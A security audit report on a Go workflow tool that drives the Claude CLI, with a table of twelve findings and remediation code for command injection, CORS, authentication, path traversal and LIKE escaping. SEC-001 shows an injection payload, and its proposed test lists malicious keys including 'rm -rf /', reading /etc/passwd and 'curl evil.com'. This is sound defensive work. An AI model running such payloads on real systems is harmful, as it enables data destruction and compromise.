# Security Audit Report

## Risk Matrix

| ID      | Vulnerability           | Severity | CVSS | Location               | OWASP Category                 |
| ------- | ----------------------- | -------- | ---- | ---------------------- | ------------------------------ |
| SEC-001 | Shell Command Injection | CRITICAL | 9.8  | `executor.go:278-316`  | A03:2021 Injection             |
| SEC-002 | Dangerous CLI Flag      | CRITICAL | 9.0  | `executor.go:283-312`  | A05:2021 Misconfiguration      |
| SEC-003 | Permissive CORS         | HIGH     | 7.5  | `server.go:164-177`    | A05:2021 Misconfiguration      |
| SEC-004 | No API Authentication   | HIGH     | 8.6  | `server.go:109-161`    | A01:2021 Broken Access Control |
| SEC-005 | No WebSocket Auth       | HIGH     | 8.6  | `websocket.go:136-158` | A01:2021 Broken Access Control |
| SEC-006 | WebSocket Origin Bypass | HIGH     | 7.5  | `websocket.go:137-139` | A05:2021 Misconfiguration      |
| SEC-007 | No Rate Limiting        | MEDIUM   | 5.3  | `server.go:109-161`    | A05:2021 Misconfiguration      |
| SEC-008 | Path Traversal Risk     | MEDIUM   | 6.5  | `profile.go:97,113`    | A01:2021 Broken Access Control |
| SEC-009 | YAML Deserialization    | MEDIUM   | 5.5  | `yaml.go:31`           | A08:2021 Integrity Failures    |
| SEC-010 | Sensitive Panic Logs    | LOW      | 3.7  | `main.go:18-22`        | A09:2021 Logging Failures      |
| SEC-011 | LIKE Wildcard Injection | LOW      | 4.3  | `sqlite.go:702-703`    | A03:2021 Injection             |
| SEC-012 | No Input Validation     | MEDIUM   | 5.3  | `server.go:289-322`    | A03:2021 Injection             |

---

## SEC-001: Shell Command Injection [CRITICAL]

### Location

`internal/executor/executor.go:278-316`

### Description

The `buildCommand()` function constructs shell commands using unsanitized user input (story keys). The story key is directly interpolated into a shell command string executed via `sh -c`.

```go
func (e *Executor) buildCommand(stepName domain.StepName, story domain.Story) string {
    switch stepName {
    case domain.StepCreateStory:
        return fmt.Sprintf(
            `claude --dangerously-skip-permissions -p "/bmad:bmm:workflows:create-story - Create story: %s"`,
            story.Key,  // VULNERABLE: User-controlled input in shell command
        )
    // ...
    }
}

// executor.go:210
cmd := exec.CommandContext(ctx, "sh", "-c", step.Command)
```

### Attack Vector

A malicious story key like `"; rm -rf /; echo "` could lead to arbitrary command execution.

### Impact

- Complete system compromise
- Data destruction
- Privilege escalation

### Remediation

**Option 1: Use exec.Command with separate arguments (Recommended)**

```go
func (e *Executor) buildCommand(stepName domain.StepName, story domain.Story) *exec.Cmd {
    prompt := fmt.Sprintf("/bmad:bmm:workflows:create-story - Create story: %s", story.Key)
    return exec.CommandContext(ctx, "claude", "--dangerously-skip-permissions", "-p", prompt)
}
```

**Option 2: Strict input validation**

```go
var validStoryKey = regexp.MustCompile(`^[0-9]+-[0-9]+-[a-zA-Z0-9_-]+$`)

func sanitizeStoryKey(key string) (string, error) {
    if !validStoryKey.MatchString(key) {
        return "", fmt.Errorf("invalid story key format: %s", key)
    }
    return key, nil
}
```

### Test Cases to Add

```go
func TestBuildCommand_RejectsCommandInjection(t *testing.T) {
    maliciousKeys := []string{
        "3-1-test; rm -rf /",
        "3-1-test$(whoami)",
        "3-1-test`id`",
        "3-1-test | cat /etc/passwd",
        "3-1-test && curl evil.com",
        "3-1-test\"; echo pwned; \"",
    }
    for _, key := range maliciousKeys {
        t.Run(key, func(t *testing.T) {
            _, err := sanitizeStoryKey(key)
            assert.Error(t, err)
        })
    }
}
```

---

## SEC-002: Dangerous CLI Flag [CRITICAL]

### Location

`internal/executor/executor.go:283-312`

### Description

Uses `--dangerously-skip-permissions` flag when invoking Claude CLI, bypassing security permissions.

### Impact

Claude subprocess can execute arbitrary commands, read/write any file accessible to the user.

### Remediation

1. Document the security implications clearly for users
2. Add configuration option to enable/disable with warnings
3. Consider sandboxed execution (Docker, restricted user)
4. Add prominent security section to README and docs

---

## SEC-003: Permissive CORS [HIGH]

### Location

`internal/api/server.go:164-177`

### Current Code

```go
func corsMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Access-Control-Allow-Origin", "*")  // VULNERABLE
        // ...
    })
}
```

### Remediation

```go
func corsMiddleware(allowedOrigins []string) func(http.Handler) http.Handler {
    allowed := make(map[string]bool)
    for _, o := range allowedOrigins {
        allowed[o] = true
    }

    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            origin := r.Header.Get("Origin")
            if allowed[origin] {
                w.Header().Set("Access-Control-Allow-Origin", origin)
                w.Header().Set("Access-Control-Allow-Credentials", "true")
            }
            // ...
        })
    }
}

// Usage:
r.Use(corsMiddleware([]string{"http://localhost:3000", "http://localhost:8080"}))
```

---

## SEC-004: No API Authentication [HIGH]

### Location

`internal/api/server.go:109-161`

### Description

All API endpoints are publicly accessible without authentication.

### Remediation

```go
func authMiddleware(apiKey string) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            key := r.Header.Get("X-API-Key")
            if key == "" || key != apiKey {
                http.Error(w, "Unauthorized", http.StatusUnauthorized)
                return
            }
            next.ServeHTTP(w, r)
        })
    }
}

// In setupRoutes():
apiKey := os.Getenv("BMAD_API_KEY")
if apiKey != "" {
    r.Use(authMiddleware(apiKey))
}
```

---

## SEC-005: No WebSocket Authentication [HIGH]

### Location

`internal/api/websocket.go:136-158`

### Current Code

```go
func (h *WebSocketHub) ServeWs(w http.ResponseWriter, r *http.Request) {
    conn, err := websocket.Accept(w, r, &websocket.AcceptOptions{
        OriginPatterns: []string{"*"},  // No authentication
    })
    // Immediately registered without verification
    h.register <- client
}
```

### Remediation

```go
func (h *WebSocketHub) ServeWs(w http.ResponseWriter, r *http.Request) {
    // Validate API key from query parameter or header
    apiKey := r.URL.Query().Get("api_key")
    if apiKey == "" {
        apiKey = r.Header.Get("X-API-Key")
    }
    if apiKey != h.expectedAPIKey {
        http.Error(w, "Unauthorized", http.StatusUnauthorized)
        return
    }

    conn, err := websocket.Accept(w, r, &websocket.AcceptOptions{
        OriginPatterns: []string{
            "http://localhost:*",
            "https://your-domain.com",
        },
    })
    // ...
}
```

---

## SEC-007: No Rate Limiting [MEDIUM]

### Location

`internal/api/server.go:109-161`

### Remediation

```go
import "golang.org/x/time/rate"

func rateLimitMiddleware(rps float64, burst int) func(http.Handler) http.Handler {
    limiter := rate.NewLimiter(rate.Limit(rps), burst)
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            if !limiter.Allow() {
                http.Error(w, "Rate limit exceeded", http.StatusTooManyRequests)
                return
            }
            next.ServeHTTP(w, r)
        })
    }
}

// Usage: Allow 10 requests/second with burst of 20
r.Use(rateLimitMiddleware(10, 20))
```

---

## SEC-008: Path Traversal in Profile Names [MEDIUM]

### Location

`internal/profile/profile.go:97,113`

### Current Code

```go
path := filepath.Join(ps.profileDir, profile.Name+".yaml")
```

### Remediation

```go
func validateProfileName(name string) error {
    if name == "" {
        return fmt.Errorf("profile name cannot be empty")
    }
    if strings.Contains(name, "/") || strings.Contains(name, "\\") ||
       strings.Contains(name, "..") {
        return fmt.Errorf("invalid profile name: contains path separator")
    }
    validPattern := regexp.MustCompile(`^[a-zA-Z0-9_-]+$`)
    if !validPattern.MatchString(name) {
        return fmt.Errorf("profile name contains invalid characters")
    }
    return nil
}
```

---

## SEC-011: LIKE Wildcard Injection [LOW]

### Location

`internal/storage/sqlite.go:702-703`

### Current Code

```go
if filter.StoryKey != "" {
    conditions = append(conditions, "story_key LIKE ?")
    args = append(args, "%"+filter.StoryKey+"%")
}
```

### Remediation

```go
func escapeLikeWildcards(s string) string {
    s = strings.ReplaceAll(s, "\\", "\\\\")
    s = strings.ReplaceAll(s, "%", "\\%")
    s = strings.ReplaceAll(s, "_", "\\_")
    return s
}

// Usage:
args = append(args, "%"+escapeLikeWildcards(filter.StoryKey)+"%")
```

---

## Positive Security Observations

1. **SQL Injection Prevention:** All SQL queries use parameterized queries with `?` placeholders
2. **Git Command Safety:** Git commands use `exec.Command()` with separate arguments
3. **WAL Mode for SQLite:** Properly configured database
4. **Context Timeouts:** Execution has configurable timeout handling
5. **Transaction Safety:** Database operations use proper transaction handling
6. **No Hardcoded Secrets:** No credentials found in source code

---

## Dependency Security

**govulncheck Results:** No known vulnerabilities found

| Dependency                 | Version | Assessment                       |
| -------------------------- | ------- | -------------------------------- |
| `modernc.org/sqlite`       | v1.42.2 | Pure Go - no CGO vulnerabilities |
| `gopkg.in/yaml.v3`         | v3.0.1  | Mitigates YAML attacks           |
| `nhooyr.io/websocket`      | v1.8.17 | No known CVEs                    |
| `github.com/go-chi/chi/v5` | v5.2.0  | No known issues                  |

---

## Remediation Priority

| Priority         | Issues                                      | Effort |
| ---------------- | ------------------------------------------- | ------ |
| P0 (Immediate)   | SEC-001, SEC-002, SEC-003, SEC-004, SEC-005 | Medium |
| P1 (This Sprint) | SEC-006, SEC-007, SEC-012                   | Medium |
| P2 (Next Sprint) | SEC-008, SEC-009                            | Low    |
| P3 (Backlog)     | SEC-010, SEC-011                            | Low    |
